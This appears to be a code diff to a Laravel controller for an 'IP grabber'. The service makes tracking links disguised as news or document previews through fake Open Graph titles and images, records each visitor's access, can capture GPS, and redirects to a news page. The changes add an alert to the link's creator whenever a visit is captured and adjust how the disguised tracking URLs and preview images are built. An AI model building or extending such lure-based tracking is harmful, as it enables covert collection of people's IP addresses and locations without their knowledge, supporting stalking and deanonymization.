@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Models\IpGrabber;
 use App\Models\IpGrabberAccess;
+use App\Notifications\IpGrabberAccessCapturedNotification;
 use App\Services\Pixel\NewsPreviewMetadataService;
 use Illuminate\Http\Request;
 use Illuminate\Http\Response;
@@ -34,8 +35,10 @@ class IpGrabberController extends Controller
         $mensagem = $ipGrabber?->mensagem ?? 'Este documento não está mais disponível.';
         $ogTitulo = $ipGrabber?->og_titulo ?? $mensagem;
         $ogDescricao = $ipGrabber?->og_descricao ?? '';
-        $ogImagem = $this->resolverImagemOpenGraph($ipGrabber);
-        $ogUrl = $ipGrabber?->trackingUrl() ?? $this->urlAbsolutaDaRequisicao($request, $request->getPathInfo());
+        $ogImagem = $this->resolverImagemOpenGraph($ipGrabber, $request);
+        $ogUrl = $ipGrabber
+            ? ($ipGrabber->trackingDomain() ? $ipGrabber->trackingUrl() : $this->urlAbsolutaDaRequisicao($request, route('pixel.track', $token, false)))
+            : $this->urlAbsolutaDaRequisicao($request, $request->getPathInfo());
         $captureGps = (bool) $ipGrabber?->capture_gps;
         $redirectUrl = $this->deveRedirecionarParaNoticia($request, $ipGrabber) ? $ipGrabber->noticia_url : null;
 
@@ -164,6 +167,8 @@ class IpGrabberController extends Controller
                 'total_acessos' => $ipGrabber->total_acessos + 1,
                 'clicked_at' => $ipGrabber->clicked_at ?? now(),
             ]);
+
+            $ipGrabber->criador?->notify(new IpGrabberAccessCapturedNotification($acesso));
 
             return $acesso;
         } catch (\Throwable $e) {
@@ -322,7 +327,7 @@ class IpGrabberController extends Controller
         return $request->boolean('preview');
     }
 
-    private function resolverImagemOpenGraph(?IpGrabber $ipGrabber): array
+    private function resolverImagemOpenGraph(?IpGrabber $ipGrabber, Request $request): array
     {
         if (! $ipGrabber) {
             return ['url' => null, 'type' => null];
@@ -333,7 +338,9 @@ class IpGrabberController extends Controller
             $dimensions = $this->dimensoesDaImagem(Storage::disk('public')->path($path));
 
             return [
-                'url' => $ipGrabber->trackingAssetUrl(route('pixel.og-image', $ipGrabber->token, false)),
+                'url' => $ipGrabber->trackingDomain()
+                    ? $ipGrabber->trackingAssetUrl(route('pixel.og-image', $ipGrabber->token, false))
+                    : $this->urlAbsolutaDaRequisicao($request, route('pixel.og-image', $ipGrabber->token, false)),
                 'type' => $this->mimeTypePorExtensao($path) ?: Storage::disk('public')->mimeType($path),
                 'width' => $dimensions['width'] ?? null,
                 'height' => $dimensions['height'] ?? null,
